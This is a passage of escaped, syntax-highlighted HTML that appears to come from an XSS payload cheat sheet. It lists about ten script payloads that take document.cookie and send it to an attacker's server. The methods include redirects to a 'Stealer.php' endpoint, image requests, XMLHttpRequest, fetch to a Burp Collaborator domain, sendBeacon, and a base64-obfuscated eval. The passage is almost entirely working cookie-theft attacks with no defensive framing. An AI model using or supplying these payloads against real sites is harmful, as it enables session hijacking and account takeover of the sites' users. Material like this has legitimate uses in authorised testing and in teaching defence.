&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;window.location.assign&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/Stealer.php?cookie=&amp;#39;&lt;/span>+document.cookie&lt;span class="o">)&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;window&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;location&amp;#39;&lt;/span>&lt;span class="o">][&lt;/span>&lt;span class="s1">&amp;#39;assign&amp;#39;&lt;/span>&lt;span class="o">](&lt;/span>&lt;span class="s1">&amp;#39;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/Stealer.php?cookie=&amp;#39;&lt;/span>+document.cookie&lt;span class="o">)&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;window&lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;location&amp;#39;&lt;/span>&lt;span class="o">][&lt;/span>&lt;span class="s1">&amp;#39;href&amp;#39;&lt;/span>&lt;span class="o">](&lt;/span>&lt;span class="s1">&amp;#39;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/Stealer.php?cookie=&amp;#39;&lt;/span>+document.cookie&lt;span class="o">)&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;document.location&lt;span class="o">=[&lt;/span>&lt;span class="s2">&amp;#34;http://&amp;lt;YOUR_SERVER_IP&amp;gt;?c&amp;#34;&lt;/span>,document.cookie&lt;span class="o">]&lt;/span>.join&lt;span class="o">()&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;var &lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>new Image&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>i.src&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://&amp;lt;YOUR_SERVER_IP&amp;gt;/?c=&amp;#34;&lt;/span>+document.cookie&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;window.location&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;https://&amp;lt;SERVER_IP&amp;gt;/?c=&amp;#34;&lt;/span>.concat&lt;span class="o">(&lt;/span>document.cookie&lt;span class="o">)&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;var &lt;span class="nv">xhttp&lt;/span>&lt;span class="o">=&lt;/span>new XMLHttpRequest&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>xhttp.open&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;GET&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;http://&amp;lt;SERVER_IP&amp;gt;/?c=&amp;#34;&lt;/span>%2Bdocument.cookie, &lt;span class="nb">true&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>xhttp.send&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;eval&lt;span class="o">(&lt;/span>atob&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp&amp;#39;&lt;/span>&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;fetch&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net&amp;#39;&lt;/span>, &lt;span class="o">{&lt;/span>method: &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>, mode: &lt;span class="s1">&amp;#39;no-cors&amp;#39;&lt;/span>, body:document.cookie&lt;span class="o">})&lt;/span>&lt;span class="p">;&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;script&amp;gt;navigator.sendBeacon&lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;https://ssrftest.com/x/AAAAA&amp;#39;&lt;/span>,document.cookie&lt;span class="o">)&lt;/span>&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
